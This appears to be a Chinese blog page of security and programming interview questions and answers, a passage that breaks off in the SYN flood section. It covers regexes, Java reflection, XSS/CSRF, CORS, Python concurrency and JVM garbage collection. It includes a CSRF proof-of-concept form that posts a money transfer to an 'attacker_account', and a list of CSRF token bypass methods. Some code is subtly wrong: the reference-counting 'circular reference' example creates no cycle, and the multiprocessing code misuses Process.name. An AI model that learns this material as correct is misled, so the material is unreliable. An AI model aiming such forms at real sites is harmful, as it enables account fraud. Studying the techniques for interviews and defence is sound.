<h3 id="不查资料不能测试直接写IPv4的正则"><a href="#不查资料不能测试直接写IPv4的正则" class="headerlink" title="不查资料不能测试直接写IPv4的正则"></a>不查资料不能测试直接写IPv4的正则</h3><p>以下是验证IPv4地址的正则表达式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$</span><br></pre></td></tr></table></figure>
<p><strong>说明</strong>：</p>
<ul>
<li><code>25[0-5]</code>：匹配250到255之间的数字。</li>
<li><code>2[0-4][0-9]</code>：匹配200到249之间的数字。</li>
<li><code>[01]?[0-9][0-9]?</code>：匹配0到199之间的数字。</li>
<li><code>\.)&#123;3&#125;</code>：匹配三个点，表示四个字节之间的分隔符。</li>
</ul>
<h3 id="Java反射机制会导致怎样的安全问题"><a href="#Java反射机制会导致怎样的安全问题" class="headerlink" title="Java反射机制会导致怎样的安全问题"></a>Java反射机制会导致怎样的安全问题</h3><p>Java反射机制允许在运行时动态加载类、调用方法和访问字段，这可能导致以下安全问题：</p>
<ol>
<li><p><strong>动态加载恶意类</strong>：<br>反射机制可以动态加载类，攻击者可能利用这一点加载恶意类，执行未经授权的操作。</p>
</li>
<li><p><strong>调用敏感方法</strong>：<br>反射可以调用私有或受保护的方法，绕过正常的访问控制。例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionExample</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sensitiveMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is a sensitive method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ReflectionExample</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExample</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionExample.class.getDeclaredMethod(<span class="string">&quot;sensitiveMethod&quot;</span>);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码通过反射调用了<code>private</code>方法<code>SensitiveMethod</code>，绕过了访问控制。</p>
</li>
<li><p><strong>信息泄露</strong>：<br>反射可以访问类的私有字段，可能导致敏感信息泄露。</p>
</li>
<li><p><strong>性能问题</strong>：<br>反射机制的使用可能导致性能下降，尤其是在频繁调用的情况下。</p>
</li>
</ol>
<h3 id="XSS和CSRF的相同点以及如何配合利用"><a href="#XSS和CSRF的相同点以及如何配合利用" class="headerlink" title="XSS和CSRF的相同点以及如何配合利用"></a>XSS和CSRF的相同点以及如何配合利用</h3><ul>
<li><strong>相同点</strong>：<ul>
<li><strong>滥用信任关系</strong>：两者都滥用Web应用程序和用户之间的信任关系。XSS攻击利用服务器对用户输入数据的信任，CSRF攻击则利用服务器对用户身份的信任。</li>
<li><strong>攻击目标</strong>：都可能对用户或Web应用程序造成危害，如窃取用户信息、执行非预期操作等。</li>
<li><strong>服务器端问题</strong>：都是由于服务器端对用户提供的数据过于信任或过滤不严导致的。</li>
</ul>
</li>
<li><strong>配合利用</strong>：<ul>
<li><strong>XSS作为载体</strong>：利用XSS漏洞注入恶意脚本，该脚本可以自动发送CSRF攻击请求，无需用户交互。例如，攻击者通过XSS漏洞在目标网站注入一段JavaScript代码，这段代码会在用户访问受感染页面时自动发送CSRF请求，执行恶意操作。</li>
<li><strong>CSRF利用XSS</strong>：攻击者可以先利用CSRF漏洞伪造请求，将恶意脚本注入到用户的浏览器中，从而实现XSS攻击。例如，攻击者构造一个CSRF请求，将恶意脚本存储在目标网站的某个页面中，当用户访问该页面时，恶意脚本就会被执行。</li>
</ul>
</li>
</ul>
<h3 id="CSRF-TOKEN的位置、原理和绕过"><a href="#CSRF-TOKEN的位置、原理和绕过" class="headerlink" title="CSRF_TOKEN的位置、原理和绕过"></a>CSRF_TOKEN的位置、原理和绕过</h3><ul>
<li><strong>位置</strong>：CSRF_TOKEN通常位于表单的隐藏字段中，或者作为HTTP请求头的一部分。</li>
<li><strong>原理</strong>：CSRF_TOKEN是一个随机生成的值，服务器在处理请求时会验证该令牌是否有效。如果令牌无效，服务器将拒绝处理该请求，从而防止CSRF攻击。</li>
<li><strong>绕过方法</strong>：<ul>
<li><strong>XSS攻击</strong>：通过XSS漏洞窃取CSRF_TOKEN，然后在CSRF攻击中使用该令牌。</li>
<li><strong>预测令牌</strong>：如果CSRF_TOKEN的生成算法存在漏洞，攻击者可能通过预测令牌来绕过防护。</li>
<li><strong>利用第三方漏洞</strong>：如果目标网站存在其他漏洞，如SSRF，攻击者可以利用这些漏洞来获取CSRF_TOKEN。</li>
</ul>
</li>
</ul>
<h3 id="尽可能多地说你所知道的HTTP头"><a href="#尽可能多地说你所知道的HTTP头" class="headerlink" title="尽可能多地说你所知道的HTTP头"></a>尽可能多地说你所知道的HTTP头</h3><ul>
<li><strong>请求头</strong>：<ul>
<li><strong>Host</strong>：指定请求的主机名和端口号。</li>
<li><strong>User-Agent</strong>：包含发起请求的用户代理信息，如浏览器类型和版本。</li>
<li><strong>Referer</strong>：指示请求的来源页面。</li>
<li><strong>Cookie</strong>：包含用户的会话信息。</li>
<li><strong>Authorization</strong>：用于HTTP认证。</li>
<li><strong>Accept</strong>：指定客户端能够处理的内容类型。</li>
<li><strong>Accept-Language</strong>：指定客户端偏好的语言。</li>
<li><strong>Accept-Encoding</strong>：指定客户端能够理解的内容编码。</li>
<li><strong>Connection</strong>：指定连接类型，如<code>keep-alive</code>或<code>close</code>。</li>
</ul>
</li>
<li><strong>响应头</strong>：<ul>
<li><strong>Server</strong>：包含服务器的信息。</li>
<li><strong>Date</strong>：包含响应生成的日期和时间。</li>
<li><strong>Content-Type</strong>：指定响应的内容类型。</li>
<li><strong>Content-Length</strong>：指定响应内容的长度。</li>
<li><strong>Set-Cookie</strong>：用于设置用户代理的Cookie。</li>
<li><strong>Location</strong>：用于重定向。</li>
<li><strong>WWW-Authenticate</strong>：用于响应401未授权状态码。</li>
<li><strong>ETag</strong>：用于缓存验证。</li>
<li><strong>Cache-Control</strong>：指定缓存机制。</li>
</ul>
</li>
</ul>
<h3 id="Nmap常见扫描方式的原理以及NSE脚本原理"><a href="#Nmap常见扫描方式的原理以及NSE脚本原理" class="headerlink" title="Nmap常见扫描方式的原理以及NSE脚本原理"></a>Nmap常见扫描方式的原理以及NSE脚本原理</h3><ul>
<li><strong>常见扫描方式</strong>：<ul>
<li><strong>TCP SYN扫描</strong>：发送SYN包，根据目标端口的响应判断端口状态。</li>
<li><strong>TCP Connect扫描</strong>：完成TCP三次握手，判断端口是否开放。</li>
<li><strong>UDP扫描</strong>：发送UDP数据包，根据目标端口的响应判断端口状态。</li>
<li><strong>版本检测扫描</strong>：发送特定协议的数据包，检测目标服务的版本信息。</li>
</ul>
</li>
<li><strong>NSE脚本原理</strong>：<ul>
<li><strong>NSE脚本</strong>：用于自动化安全测试和信息收集。NSE脚本可以执行各种任务，如端口扫描、漏洞检测、信息收集等。</li>
<li><strong>脚本执行</strong>：NSE脚本在Nmap的扫描过程中执行，可以根据扫描结果动态调整扫描策略。</li>
<li><strong>示例脚本</strong>：以下是一个简单的NSE脚本，用于检测目标主机是否开放了某个端口：  <figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">description = <span class="string">[[</span></span><br><span class="line"><span class="string">Simple NSE script to detect if a port is open.</span></span><br><span class="line"><span class="string">]]</span></span><br><span class="line">author = <span class="string">&quot;Your Name&quot;</span></span><br><span class="line">license = <span class="string">&quot;Same as Nmap--See https://nmap.org/book/man-legal.html&quot;</span></span><br><span class="line">categories = &#123;<span class="string">&quot;default&quot;</span>, <span class="string">&quot;safe&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">    <span class="keyword">return</span> port.number == <span class="number">80</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">    nmap.outputln(<span class="string">&quot;Port 80 is open on &quot;</span> .. host.ip)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
  这个脚本会在扫描过程中检查目标主机的80端口是否开放，并输出相应的结果。</li>
</ul>
</li>
</ul>
<h3 id="跨域的解决办法原理以及安全问题"><a href="#跨域的解决办法原理以及安全问题" class="headerlink" title="跨域的解决办法原理以及安全问题"></a>跨域的解决办法原理以及安全问题</h3><h4 id="1-CORS（跨域资源共享）"><a href="#1-CORS（跨域资源共享）" class="headerlink" title="1. CORS（跨域资源共享）"></a>1. CORS（跨域资源共享）</h4><p><strong>原理</strong>：CORS通过服务端设置HTTP响应头，声明允许的跨域请求来源与方法。服务端需要在响应头中添加如<code>Access-Control-Allow-Origin</code>等字段，告诉浏览器哪些源可以访问该资源。</p>
<p><strong>示例代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/data&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    <span class="comment"># 设置响应头</span></span><br><span class="line">    response = jsonify(&#123;<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;This is cross-origin data&#x27;</span>&#125;)</span><br><span class="line">    response.headers.add(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p><strong>安全问题</strong>：</p>
<ul>
<li><strong>信息泄露</strong>：如果<code>Access-Control-Allow-Origin</code>设置为<code>*</code>，任何域都可以访问该资源，可能导致敏感数据泄露。</li>
<li><strong>CSRF攻击</strong>：如果允许凭据（如Cookie），需要确保请求来源的合法性，避免CSRF攻击。</li>
</ul>
<h4 id="2-JSONP（JSON-with-Padding）"><a href="#2-JSONP（JSON-with-Padding）" class="headerlink" title="2. JSONP（JSON with Padding）"></a>2. JSONP（JSON with Padding）</h4><p><strong>原理</strong>：JSONP利用<code>&lt;script&gt;</code>标签不受同源策略限制的特性，通过动态创建脚本实现跨域数据获取。服务端返回的数据被包装在一个函数调用中，前端通过定义回调函数来处理数据。</p>
<p><strong>示例代码</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前端代码</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleResponse</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Received data:&#x27;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;https://api.example.com/data?callback=handleResponse&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br></pre></td></tr></table></figure>

<p><strong>安全问题</strong>：</p>
<ul>
<li><strong>XSS攻击</strong>：由于JSONP加载的是外部脚本，如果服务端返回恶意脚本，可能会导致XSS攻击。</li>
<li><strong>限制GET请求</strong>：JSONP只支持GET请求，无法处理POST等其他HTTP方法。</li>
</ul>
<h4 id="3-Nginx反向代理"><a href="#3-Nginx反向代理" class="headerlink" title="3. Nginx反向代理"></a>3. Nginx反向代理</h4><p><strong>原理</strong>：通过Nginx配置，将前端请求转发到目标服务器，使浏览器认为所有请求都来自同一域，从而避免跨域问题。</p>
<p><strong>Nginx配置示例</strong>：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> localhost;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> /api &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://api.example.com;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>安全问题</strong>：</p>
<ul>
<li><strong>代理配置不当</strong>：如果代理配置不当，可能会暴露内部服务地址，增加安全风险。</li>
<li><strong>性能问题</strong>：代理服务器需要处理额外的请求，可能会增加系统负载。</li>
</ul>
<h3 id="Python多进程和多线程如何选择"><a href="#Python多进程和多线程如何选择" class="headerlink" title="Python多进程和多线程如何选择"></a>Python多进程和多线程如何选择</h3><h4 id="1-多线程"><a href="#1-多线程" class="headerlink" title="1. 多线程"></a>1. 多线程</h4><p><strong>适用场景</strong>：</p>
<ul>
<li><strong>I&#x2F;O密集型任务</strong>：如网络请求、文件读写等，线程可以利用等待时间进行其他任务。</li>
<li><strong>需要快速响应的场景</strong>：如Web服务器处理多个客户端请求。</li>
</ul>
<p><strong>示例代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">io_bound_task</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;threading.current_thread().name&#125;</span> started&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)  <span class="comment"># 模拟I/O操作</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;threading.current_thread().name&#125;</span> finished&quot;</span>)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    t = threading.Thread(target=io_bound_task)</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure>

<h4 id="2-多进程"><a href="#2-多进程" class="headerlink" title="2. 多进程"></a>2. 多进程</h4><p><strong>适用场景</strong>：</p>
<ul>
<li><strong>计算密集型任务</strong>：需要利用多核CPU的并行计算能力。</li>
<li><strong>需要高稳定性和资源独立性的场景</strong>。</li>
</ul>
<p><strong>示例代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu_bound_task</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Process <span class="subst">&#123;Process.name&#125;</span> started&quot;</span>)</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        <span class="built_in">sum</span> += i</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Process <span class="subst">&#123;Process.name&#125;</span> finished&quot;</span>)</span><br><span class="line"></span><br><span class="line">processes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    p = Process(target=cpu_bound_task)</span><br><span class="line">    processes.append(p)</span><br><span class="line">    p.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">    p.join()</span><br></pre></td></tr></table></figure>

<h3 id="Python的GIL锁本质上做了什么事情"><a href="#Python的GIL锁本质上做了什么事情" class="headerlink" title="Python的GIL锁本质上做了什么事情"></a>Python的GIL锁本质上做了什么事情</h3><p><strong>GIL（Global Interpreter Lock）</strong>是Python解释器的一个机制，用于确保同一时刻只有一个线程执行Python字节码。它的主要作用是：</p>
<ul>
<li><strong>线程安全</strong>：避免多线程同时操作Python对象，确保线程安全。</li>
<li><strong>简化内存管理</strong>：减少内存分配和垃圾回收的复杂性。</li>
</ul>
<p><strong>影响</strong>：</p>
<ul>
<li><strong>性能瓶颈</strong>：在多核CPU上，GIL会限制多线程的性能，因为线程无法真正并行执行。</li>
<li><strong>适用场景</strong>：对于I&#x2F;O密集型任务，GIL的影响较小；但对于计算密集型任务，建议使用多进程或C扩展。</li>
</ul>
<h3 id="Java的JVM为什么要有GCROOT"><a href="#Java的JVM为什么要有GCROOT" class="headerlink" title="Java的JVM为什么要有GCROOT"></a>Java的JVM为什么要有GCROOT</h3><p><strong>GCROOT（垃圾回收根）</strong>是Java虚拟机中垃圾回收的起点。GCROOT通常包括：</p>
<ul>
<li><strong>Java栈中的局部变量</strong>：方法调用中的参数和局部变量。</li>
<li><strong>本地方法栈中的引用</strong>：Native方法中的Java对象引用。</li>
<li><strong>运行时常量池中的类静态属性和常量</strong>。</li>
</ul>
<p>GCROOT的作用是：</p>
<ul>
<li><strong>标记活动对象</strong>：垃圾回收器从GCROOT开始标记所有可达对象。</li>
<li><strong>确定垃圾对象</strong>：未被GCROOT可达的对象将被回收。</li>
</ul>
<h3 id="Java的JVM有哪些垃圾收集器"><a href="#Java的JVM有哪些垃圾收集器" class="headerlink" title="Java的JVM有哪些垃圾收集器"></a>Java的JVM有哪些垃圾收集器</h3><ol>
<li><strong>Serial收集器</strong>：单线程收集器，适用于单核CPU和小内存应用。</li>
<li><strong>ParNew收集器</strong>：Serial的多线程版本，适用于多核CPU。</li>
<li><strong>Parallel Scavenge收集器</strong>：关注吞吐量，适用于后台运行的应用。</li>
<li><strong>Serial Old收集器</strong>：Serial的老年代版本，适用于小内存应用。</li>
<li><strong>Parallel Old收集器</strong>：Parallel Scavenge的老年代版本，适用于多核CPU。</li>
<li><strong>CMS（Concurrent Mark Sweep）收集器</strong>：低延迟收集器，适用于对响应时间敏感的应用。</li>
<li><strong>G1（Garbage-First）收集器</strong>：分区收集器，适用于大内存和对延迟有要求的应用。</li>
</ol>
<h3 id="垃圾回收计数引用机制的缺点是什么"><a href="#垃圾回收计数引用机制的缺点是什么" class="headerlink" title="垃圾回收计数引用机制的缺点是什么"></a>垃圾回收计数引用机制的缺点是什么</h3><ol>
<li><strong>无法处理循环引用</strong>：如果两个对象互相引用，但没有其他引用指向它们，计数引用机制无法回收这些对象。</li>
<li><strong>性能开销</strong>：维护引用计数需要额外的内存和计算资源。</li>
<li><strong>复杂性</strong>：在多线程环境下，引用计数需要同步操作，增加了实现的复杂性。</li>
</ol>
<p><strong>示例代码</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReferenceCountingExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        a = b;</span><br><span class="line">        b = a; <span class="comment">// 循环引用，但没有其他引用指向它们</span></span><br><span class="line">        <span class="comment">// 此时，a和b互相引用，但没有其他引用指向它们，无法被垃圾回收</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="CSRF-怎么拿到-Cookie"><a href="#CSRF-怎么拿到-Cookie" class="headerlink" title="CSRF 怎么拿到 Cookie"></a>CSRF 怎么拿到 Cookie</h3><p>CSRF（Cross-Site Request Forgery）攻击的核心是利用受害者的身份认证信息（如Cookie）发送恶意请求。浏览器会自动携带用户的Cookie，攻击者可以通过伪造请求来利用这一点。例如，攻击者可以构造一个HTML表单，提交到目标网站，从而触发CSRF攻击：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://example.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker_account&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click Me&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当用户访问包含此表单的恶意页面并提交表单时，浏览器会自动携带用户的Cookie，从而完成攻击。</p>
<h3 id="不同域名怎样通过-CSRF-拿-Cookie"><a href="#不同域名怎样通过-CSRF-拿-Cookie" class="headerlink" title="不同域名怎样通过 CSRF 拿 Cookie"></a>不同域名怎样通过 CSRF 拿 Cookie</h3><p>跨域场景下，CSRF攻击的可行性取决于目标网站的Cookie设置。如果目标网站的Cookie设置了<code>SameSite</code>属性为<code>Strict</code>或<code>Lax</code>，则跨域请求不会携带Cookie。如果<code>SameSite</code>设置为<code>None</code>且启用了<code>Secure</code>属性，跨域请求可以携带Cookie。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置Cookie</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;666666&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;expires&#x27;</span> =&gt; <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>,</span><br><span class="line">    <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;domain&#x27;</span> =&gt; <span class="string">&#x27;example.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;secure&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;httponly&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;samesite&#x27;</span> =&gt; <span class="string">&#x27;None&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<p>攻击者可以通过构造跨域请求来尝试利用这一点。</p>
<h3 id="HTTP-Only-本质上做了什么事情"><a href="#HTTP-Only-本质上做了什么事情" class="headerlink" title="HTTP-Only 本质上做了什么事情"></a>HTTP-Only 本质上做了什么事情</h3><p>HTTP-Only 属性用于防止JavaScript访问Cookie，从而避免XSS攻击中Cookie被窃取。例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript无法访问HTTP-Only Cookie</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>; <span class="comment">// 返回的Cookie中不包含HTTP-Only属性的值</span></span><br></pre></td></tr></table></figure>

<p>HTTP-Only 仅允许Cookie通过HTTP协议传输，而不能通过JavaScript读取或修改。</p>
<h3 id="平衡二叉树和二叉搜索树"><a href="#平衡二叉树和二叉搜索树" class="headerlink" title="平衡二叉树和二叉搜索树"></a>平衡二叉树和二叉搜索树</h3><ol>
<li><strong>平衡二叉树</strong>：是一种特殊的二叉树，其左右子树的高度差不超过1。例如AVL树，通过旋转操作保持平衡。</li>
<li><strong>二叉搜索树</strong>：左子树的所有节点值小于根节点，右子树的所有节点值大于根节点。例如：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, val</span>):</span><br><span class="line">        <span class="variable language_">self</span>.val = val</span><br><span class="line">        <span class="variable language_">self</span>.left = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">root, val</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">        <span class="keyword">return</span> TreeNode(val)</span><br><span class="line">    <span class="keyword">if</span> val &lt; root.val:</span><br><span class="line">        root.left = insert(root.left, val)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        root.right = insert(root.right, val)</span><br><span class="line">    <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>

<p>平衡二叉树确保了操作的时间复杂度为O(log n)，而二叉搜索树在最坏情况下可能退化为链表。</p>
<h3 id="SYN-Flood-攻击原理及解决方案"><a href="#SYN-Flood-攻击原理及解决方案" class="headerlink" title="SYN Flood 攻击原理及解决方案"></a>SYN Flood 攻击原理及解决方案</h3><ol>
<li><strong>原理</strong>：攻击者发送大量SYN包到目标服务器，但不完成三次握手，导致服务器资源耗尽。</li>
